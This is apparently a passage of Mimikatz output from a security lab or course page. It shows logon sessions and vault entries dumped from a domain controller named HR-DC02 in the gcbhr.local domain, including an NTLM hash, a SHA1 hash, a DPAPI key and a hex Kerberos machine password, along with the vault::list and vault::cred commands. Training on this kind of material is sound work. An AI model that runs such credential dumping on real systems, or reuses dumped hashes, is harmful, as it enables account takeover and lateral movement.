         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 2500037 (00000000:002625c5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:10:39 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : HR-DC02$
         * Domain   : HR
         * NTLM     : a70a37d26899db908b0f714be869a0ad
         * SHA1     : 3ab5d6cb344752f5e2c1ddf7d21bffb6d9a55eef
         * DPAPI    : 3ab5d6cb344752f5e2c1ddf7d21bffb6
        tspkg :
        wdigest :
         * Username : HR-DC02$
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : HR-DC02$
         * Domain   : gcbhr.local
         * Password : e9 79 f5 9e 94 9d 7e 65 9b f0 1b ec c2 a8 9c ed ea 31 5d ff c4 86 92 e6 2c bc f3 be 24 83 59 ef b2 52 1e f2 21 71 8c 13 ac f2 9e ed 8c 5c 41 0f e5 3c 18 5d b1 54 da 97 9e 33 cd 21 0e de 93 04 f4 1f 15 29 96 6e f4 bf 33 b7 bd cf 60 55 b5 d1 ea 31 2f 5c ac a2 10 8a 75 8c 21 a4 b0 d2 5a 7d c6 af d5 6b 20 11 bd a0 3a 11 a1 61 a2 2f 49 1a 07 9a 62 e4 aa 20 d9 ed 26 5c b3 6f 04 8f c6 a9 da 92 cf 4d 11 54 94 02 5f 50 a2 e7 af e0 66 58 9f 5a 16 c8 ac 3f 99 4e 31 c4 79 3d c2 4e b1 b1 91 32 ee 28 a7 8f 84 49 63 61 17 ee 56 30 41 39 33 04 b4 28 ec 06 66 a8 28 e8 dc a9 49 0c 90 2f 62 13 17 ad 48 1a 75 d7 6e a9 2f b5 08 b8 20 4f dd 4a 03 9f c3 f3 12 65 83 81 14 89 d6 9b e9 c3 a0 de 6d 61 98 ae 2d 56 80 29 e3 93 17 4e 97 93
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # vault::list

Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
        Name       : Web Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
        Items (0)

Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
        Name       : Windows Credentials
        Path       : C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\Vault
        Items (0)

mimikatz(commandline) # vault::cred
TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
UserName   : 02oluskhctasspqs
Comment    : PersistedCredential
Type       : 1 - generic
Persist    : 2 - local_machine
Flags      : 00000000
Credential :
Attributes : 32

```


[back](./section4.html)
